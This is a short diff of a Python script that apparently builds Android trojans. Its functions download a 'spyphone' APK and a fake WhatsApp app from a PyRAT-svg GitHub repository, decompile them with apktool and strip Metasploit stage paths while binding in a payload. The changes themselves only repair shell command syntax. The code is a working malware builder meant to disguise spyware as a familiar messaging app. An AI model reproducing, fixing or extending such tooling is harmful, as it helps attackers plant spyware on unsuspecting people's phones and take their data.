@@ -115,7 +115,7 @@ def gbwa():
 		
 def wa():
 	os.system("cd Malware && rm -rf payload.apk payload A")
-	os.system("git clone http://github.com/PyRAT-svg/WhatsApp &&mv -f WhatsApp Malware/A")
+	os.system("git clone http://github.com/PyRAT-svg/WhatsApp && mv -f WhatsApp Malware/A")
 	payload()
 	os.system("cd Malware && apktool d payload.apk -o payload")
 	os.system("rm -rf Malware/A/README.md  Malware/A/.git Malware/A/smali/com/metasploit/stage")
@@ -143,7 +143,7 @@ def spyphone_V14():
 
 	
 def spyphone():
-	os.system("wget http://github.com/PyRAT-svg/Malware/raw/master/spyphone.apk -o && mv -f spyphone.apk Malware/spyphone.apk")
+	os.system("wget http://github.com/PyRAT-svg/Malware/raw/master/spyphone.apk && mv -f spyphone.apk Malware/spyphone.apk")
 	os.system("cd Malware && rm -rf payload.apk payload spyphone")
 	os.system("cd Malware && apktool d spyphone.apk -o spyphone")
 	os.system("rm -rf Malware/spyphone.apk")
